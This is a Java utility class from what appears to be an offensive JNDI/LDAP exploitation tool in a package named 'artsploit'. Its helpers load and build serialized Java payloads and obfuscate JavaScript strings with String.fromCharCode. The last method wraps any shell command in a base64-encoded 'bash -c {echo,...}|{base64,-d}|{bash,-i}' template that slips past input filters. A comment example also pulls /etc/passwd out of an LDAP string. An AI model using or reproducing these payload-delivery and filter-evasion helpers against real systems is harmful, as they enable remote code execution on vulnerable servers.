package artsploit;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.Base64;
import java.nio.file.Paths;
import java.nio.file.Path;
import java.nio.file.Files;


public class Utilities {

    public static byte[] readSerializedPayload(String path) {
	    try { 
		    Path path_ = Paths.get(path); 
		    return Files.readAllBytes(path_);
	    } catch (Exception e) {
		    System.err.println("Failed to read serialized payload");
	    }
	    return null;
    }

    public static byte[] serialize(Object ref) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(ref);
        return out.toByteArray();
    }

    public static String makeJavaScriptString(String str) {

        ArrayList<String> result = new ArrayList<>(str.length());
        for(int i=0; i<str.length(); i++) {
            Integer x = Character.codePointAt(str, i);
            result.add(x.toString());
        }
        return "String.fromCharCode(" + String.join(",", result) + ")";
    }

    /**
     * Get a parameter value from the baseDN ldap string
     * e.g. getDnParam("o=was2,file=/etc/passwd,xxx=yyy", "file") returns "/etc/passwd"
     */
    public static String getDnParam(String baseDN, String param) {
        int startIndex = baseDN.indexOf(param + "=");
        if(startIndex == -1)
            return null;

        startIndex += param.length() + 1 ;
        int endIndex = baseDN.indexOf(',', startIndex);
        if(endIndex == -1)
            return baseDN.substring(startIndex);
        else
            return baseDN.substring(startIndex, endIndex);
    }

    /**
     * Encode bash command with Base64 to safely use within any script
     * @param command
     * @return
     */
    public static String getBase64CommandTpl(String command) {
        return "bash -c {echo," +
                Base64.getEncoder().encodeToString(command.getBytes()) +
                "}|{base64,-d}|{bash,-i}";
    }
}
